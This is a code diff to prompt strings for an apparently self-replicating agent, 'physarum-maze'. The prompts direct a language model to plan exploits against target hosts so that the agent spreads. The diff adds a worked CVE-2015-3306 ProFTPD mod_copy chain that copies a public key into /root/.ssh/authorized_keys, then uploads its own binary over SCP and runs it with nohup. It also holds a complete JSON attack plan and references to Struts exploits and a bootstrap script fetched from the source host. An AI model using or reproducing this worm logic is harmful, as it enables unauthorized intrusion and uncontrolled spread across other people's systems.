@@ -108,11 +108,18 @@ EXPLOIT MODE (when Exploit is in allowed_methods):
 When a CVE template fired with is_actionable=true AND a vulnerability_candidate has exploit_class \"RemoteCodeExecution\":
 
 GOAL: deliver and execute the physarum-maze binary on the target so the organism propagates.
-The delivery mechanism depends on which ports are open — choose SSH-first when available.
+The delivery mechanism depends on which CVE and which service protocol is exposed.
 
-── SSH-FIRST PATH (preferred — use when port 22 is open on target) ──────────────────
-This path uses only port 22 (SSH/SCP), which Security Groups always permit internally.
-No exotic ports required. Works in Docker, AWS VPC, and any real environment.
+── PROTOCOL ROUTING — choose based on the CVE family, not just the open ports ──────
+CRITICAL RULES (must not be violated):
+  1. NEVER use HttpPost or HttpGet for an FTP service (port 21, service ftp).
+     FTP speaks its own protocol — HTTP requests to port 21 always fail.
+     Use FtpModCopy for CVE-2015-3306 (ProFTPD mod_copy).
+  2. NEVER use HttpPost or HttpGet for SSH (port 22).
+     SSH is not HTTP. HTTP requests to port 22 always fail.
+  3. HttpPost and HttpGet are ONLY valid for HTTP/HTTPS services (ports 80, 443, 8080, 8443, etc.).
+  4. CVE-2015-3306 → mandatory FtpModCopy action (see PROFTPD MOD_COPY section below).
+  5. Apache Struts CVEs → mandatory __struts_bypass__ sentinel in HttpPost path.
 
 Step 1 — HttpPost (RCE via CVE): download and execute the bootstrap script.
   The agent HTTP server (source_ip:8001) serves /bootstrap.sh which plants the ephemeral pubkey
@@ -173,10 +180,30 @@ SSH-FIRST PATH GUIDANCE (when port 22 is open on target):
 
 Use the wget single-step approach only when port 22 is absent from the ports list.
 
+── PROFTPD MOD_COPY INJECTION (CVE-2015-3306) ───────────────────────────────────
+SCOPE: the FtpModCopy action is an adapter for ProFTPD 1.3.5 with mod_copy loaded.
+Preconditions (all required): mod_copy enabled in proftpd.conf, FTP port reachable,
+process runs as root (write access to /root/.ssh/authorized_keys).
+
+When the CVE is CVE-2015-3306 (ProFTPD mod_copy), use:
+
+  FTP MOD_COPY PATH (when port 21 is open and CVE-2015-3306 is the top candidate):
+  Step 1 — FtpModCopy: inject ephemeral pubkey via STOR + SITE CPFR/CPTO.
+    port: 21
+    staging_path: \"/tmp/physarum_authorized_keys\"
+    dest_path: \"/root/.ssh/authorized_keys\"
+    The executor performs: anonymous login → PASV data channel → STOR pubkey
+    → SITE CPFR staging_path → SITE CPTO dest_path. No credentials in the plan.
+  Step 2 — ScpUpload: transfer physarum-maze binary (port 22 implicit).
+    local_path: \"__self__\"
+    remote_path: \"/tmp/physarum/physarum-maze\"
+  Step 3 — SshCommand: execute binary in background.
+    command: \"mkdir -p /tmp/physarum && chmod +x /tmp/physarum/physarum-maze && nohup /tmp/physarum/physarum-maze --mode propagated >/tmp/physarum/agent.log 2>&1 &\"
+
 ── COMMON RULES ─────────────────────────────────────────────────────────────────────
 - Each CVE has its own endpoint, parameter, header, or protocol field — follow the injection
   class guidance above when the CVE matches (OGNL, deserialization, SSRF, etc.).
-- Available actions: HttpPost, HttpGet, ScpUpload, SshCommand, Custom (for non-HTTP).
+- Available actions: HttpPost, HttpGet, ScpUpload, SshCommand, FtpModCopy, Custom.
 - Multiple steps are allowed and encouraged for multi-phase CVEs.
 
 RESPONSE:
@@ -241,14 +268,74 @@ fn method_label(m: &PropagationMethodClass) -> &'static str {
 ///
 /// `method` is a **discriminated union** — it must contain EXACTLY ONE key.
 /// Listing all variants here as context only; pick the one that fits.
-pub const STRATEGY_SCHEMA: &str = r#"METHOD OPTIONS — choose exactly ONE; "method" must have exactly one key:
-  { "Exploit": { "cve": "<CVE-ID>" } }
+pub const STRATEGY_SCHEMA: &str = r#"METHOD OPTIONS — "method" field accepts EXACTLY ONE of these keys:
+  { "Exploit": { "cve": "<CVE-ID>" } }    ← use when a specific CVE RCE is confirmed
   { "Ssh":     { "user": "<string>", "auth": "EmptyPassword | PrivateKey" } }
   { "Http":    { "path": "<string>", "port": <integer>, "http_method": "Get | Post | Put", "headers": [] } }
   { "NoPath":  { "reason": "<string>" } }
 
+!!! CRITICAL: FtpModCopy is NOT in the list above. FtpModCopy is NEVER a "method" key. !!!
+FtpModCopy is ONLY valid inside bootstrap_plan.steps[N].action.
+For CVE-2015-3306, the method is { "Exploit": { "cve": "CVE-2015-3306" } } — NOT { "FtpModCopy": {...} }.
+
+── COMPLETE EXAMPLE for CVE-2015-3306 (ProFTPD mod_copy, port 21) ───────────────────
+
 {
-  "method": { "<EXACTLY_ONE_KEY_FROM_ABOVE>": { } },
+  "method": { "Exploit": { "cve": "CVE-2015-3306" } },
+  "artifact_type": "AgentBinary",
+  "bootstrap_plan": {
+    "steps": [
+      {
+        "action": {
+          "FtpModCopy": {
+            "port": 21,
+            "staging_path": "/tmp/physarum_authorized_keys",
+            "dest_path": "/root/.ssh/authorized_keys"
+          }
+        },
+        "target": "<ip>",
+        "timeout_ms": 15000,
+        "requires_root": false,
+        "expected_result": { "success_indicator": "250 Copy successful", "failure_indicator": null }
+      },
+      {
+        "action": {
+          "ScpUpload": {
+            "local_path": "__self__",
+            "remote_path": "/tmp/physarum/physarum-maze",
+            "user": "root"
+          }
+        },
+        "target": "<ip>",
+        "timeout_ms": 15000,
+        "requires_root": false,
+        "expected_result": { "success_indicator": "SCP exit 0", "failure_indicator": "SCP error" }
+      },
+      {
+        "action": {
+          "SshCommand": {
+            "command": "mkdir -p /tmp/physarum && chmod +x /tmp/physarum/physarum-maze && nohup /tmp/physarum/physarum-maze --mode propagated >/tmp/physarum/agent.log 2>&1 &",
+            "user": "root"
+          }
+        },
+        "target": "<ip>",
+        "timeout_ms": 10000,
+        "requires_root": false,
+        "expected_result": { "success_indicator": "SSH exit 0", "failure_indicator": "SSH error" }
+      }
+    ]
+  },
+  "confidence": 0.95,
+  "reasoning_summary": "CVE-2015-3306 ProFTPD mod_copy confirmed on port 21; injecting pubkey via FTP STOR+CPFR/CPTO then SSH.",
+  "preconditions": ["mod_copy enabled", "FTP port 21 open", "SSH port 22 open"],
+  "validation_check": null,
+  "safety_notes": ["CVE match from VulnerabilityIntelService — PhysarumSpore source"]
+}
+
+── GENERIC SCHEMA for HTTP-based CVEs (Apache Struts, web apps, etc.) ───────────────
+
+{
+  "method": { "Exploit": { "cve": "<CVE-ID>" } },
   "artifact_type": "AgentBinary | Script | HttpRequest | None",
   "bootstrap_plan": {
     "steps": [
